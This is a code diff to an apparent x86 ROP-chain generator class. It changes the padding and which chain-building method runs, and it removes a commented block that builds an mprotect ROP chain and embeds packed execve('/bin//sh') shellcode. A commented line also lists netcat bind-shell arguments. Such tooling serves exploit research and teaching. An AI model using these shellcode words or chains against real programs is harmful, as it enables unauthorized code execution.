@@ -377,8 +377,8 @@ class ROPMakerX86(object):
             print("\n[-] Error - Can't find a writable section")
             return
 
-        #p = b'A' * self.padding
-        p = b'A' * 44
+        p = b'A' * self.padding
+        #p = b'A' * 44
         
         #args = [b'/bin/nc', b'-lvp', b'6666']
         
@@ -594,67 +594,6 @@ class ROPMakerX86(object):
         file.write(p)
         file.close()
     
-
-        '''
-        loc_of_shellcode = stack + (4*(11 + 2*125 + 1))
-        #byte_loc_of_shellcode = loc_of_shellcode.to_bytes(4, byteorder="big")
-
-        ###############
-        #this needs to pop in ebx or ecx, has at moment its using the normal chainmask
-        #p += self.GenerateMaskRopChain(0x00000030, chainmask, {})
-
-        #print("".join('\\x{:02x}'.format(i) for i in p))
-
-        ###############
-
-        # puts start address in to ebx 
-        
-        p += pack('<I', popEbx["vaddr"]) 
-        p += pack('<I', loc_of_shellcode)#self.CCMA(byte_loc_of_shellcode, {}, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall))       # start address of the 
-        p += self.__custompadding(popEbx, {})
-
-        #puts stack in to ebx (program)
-
-        
-        #p += self.putEcx(0x00000030,popEcx,maskEcx,{"ebx": loc_of_shellcode})
-        #print("CHECK FINAL:", p)
-        
-
-        #for _ in range(48):
-        #    p += pack('<I', incEax["vaddr"])
-        #    p += self.__custompadding(incEax, FFFF)
-
-        #puts stack + 60 in to ecx (args)
-
-        p += pack('<I', popEdx["vaddr"]) 
-        p += pack('<I', 0xFFFFFFFF)#)00000004)#4) 
-        p += self.__custompadding(popEdx, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  
-
-        #puts stack in to edx (env)
-
-        p += pack('<I', xorEax["vaddr"]) 
-        p += self.__custompadding(xorEax, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  
-
-        for _ in range(10):
-            p += pack('<I', incEax["vaddr"]) 
-            p += self.__custompadding(incEax, {"ebx": loc_of_shellcode, "ecx": 0xFFFFFFFF})  # Don't overwrite ebx and ecx
-
-        #sets eax to 125
-
-        p += pack('<I', syscall["vaddr"]) 
-
-        # Call syscall
-
-        p += pack('<I', 0x31c05068) 
-        p += pack('<I', 0x2f2f7368)
-
-        p += pack('<I', 0x682f6269)
-        p += pack('<I', 0x6e89e350)
-
-        p += pack('<I', 0x5389e199)
-        p += pack('<I', 0xb00bcd80)
-
-        '''
 
     def testingmasking(self, write4where, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, maskEbx, popEcx, maskEcx, popEdx, MaskEdx, syscall, chainmask):
      
@@ -1036,8 +975,8 @@ class ROPMakerX86(object):
         print("\n- Step 5 -- Build the ROP chain\n")
 
         #self.__buildRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-        #self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
-        self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
+        self.customRopChain(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall)
+        #self.arbitrary_shell_code(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx, MaskEbx, popEcx, MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
         #self.testingmasking(write4where[0], popDst, popSrc, xorSrc, xorEax, incEax, popEbx,MaskEbx, popEcx,MaskEcx, popEdx, MaskEdx, syscall, listchainmask)
 
         #print(self.GenerateMaskRopChain(0xFFFFFF00, popDst, popSrc, xorSrc, xorEax, incEax, popEbx, popEcx, popEdx, syscall, chainmask, isaddr=True))
